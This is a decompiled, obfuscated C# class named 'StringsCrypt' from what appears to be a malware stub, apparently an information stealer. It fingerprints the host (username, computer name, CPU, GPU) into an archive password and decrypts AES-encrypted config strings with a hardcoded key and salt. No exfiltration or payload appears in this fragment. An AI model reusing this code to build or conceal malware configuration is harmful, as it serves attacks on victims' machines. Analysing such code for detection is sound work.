using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000B7 RID: 183
	internal sealed class StringsCrypt
	{
		// Token: 0x060002A9 RID: 681 RVA: 0x0001A130 File Offset: 0x00018330
		public static string GenerateRandomData(string sd = "0")
		{
			string text = sd;
			if (sd == "0")
			{
				DateTime dateTime = DateTime.Parse(SystemInfo.Datenow);
				text = dateTime.Ticks.ToString();
			}
			string text2 = string.Concat(new string[]
			{
				text,
				"-",
				SystemInfo.Username,
				"-",
				SystemInfo.Compname,
				"-",
				SystemInfo.Culture,
				"-",
				SystemInfo.GetCpuName(),
				"-",
				SystemInfo.GetGpuName()
			});
			string text3;
			using (MD5 md = MD5.Create())
			{
				text3 = string.Join("", md.ComputeHash(Encoding.UTF8.GetBytes(text2)).Select(delegate(byte ba)
				{
					byte b = ba;
					return b.ToString("x2");
				}));
			}
			return text3;
		}

		// Token: 0x060002AA RID: 682 RVA: 0x0001A23C File Offset: 0x0001843C
		public static string Decrypt(byte[] bytesToBeDecrypted)
		{
			byte[] array;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (Aes aes = Aes.Create())
				{
					aes.KeySize = 256;
					aes.BlockSize = 128;
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(StringsCrypt.CryptKey, StringsCrypt.SaltBytes, 1000);
					aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
					aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
					aes.Mode = CipherMode.CBC;
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
						cryptoStream.Close();
					}
					array = memoryStream.ToArray();
				}
			}
			return Encoding.UTF8.GetString(array);
		}

		// Token: 0x060002AB RID: 683 RVA: 0x0001A338 File Offset: 0x00018538
		public static string DecryptConfig(string value)
		{
			string text;
			if (string.IsNullOrEmpty(value))
			{
				text = "";
			}
			else if (!value.StartsWith("ENCRYPTED:"))
			{
				text = value;
			}
			else
			{
				text = StringsCrypt.Decrypt(Convert.FromBase64String(value.Replace("ENCRYPTED:", "")));
			}
			return text;
		}

		// Token: 0x060002AC RID: 684 RVA: 0x000038B4 File Offset: 0x00001AB4
		public StringsCrypt()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x060002AD RID: 685 RVA: 0x0001A388 File Offset: 0x00018588
		static StringsCrypt()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			StringsCrypt.ArchivePassword = StringsCrypt.GenerateRandomData("0");
			StringsCrypt.SaltBytes = new byte[]
			{
				102, 51, 111, 51, 75, 45, 49, 49, 61, 71,
				45, 78, 55, 86, 74, 116, 111, 122, 79, 87,
				82, 114, 61, 40, 116, 78, 90, 66, 102, 75,
				43, 98, 83, 55, 70, 121
			};
			StringsCrypt.CryptKey = new byte[]
			{
				59, 38, 75, 70, 33, 77, 33, 104, 56, 94,
				105, 84, 58, 60, 41, 97, 63, 126, 109, 88,
				101, 78, 42, 126, 111, 63, 103, 78, 91, 118,
				64, 114, 81, 61, 66
			};
		}

		// Token: 0x0400056E RID: 1390
		public static readonly string ArchivePassword;

		// Token: 0x0400056F RID: 1391
		private static readonly byte[] SaltBytes;

		// Token: 0x04000570 RID: 1392
		private static readonly byte[] CryptKey;
	}
}
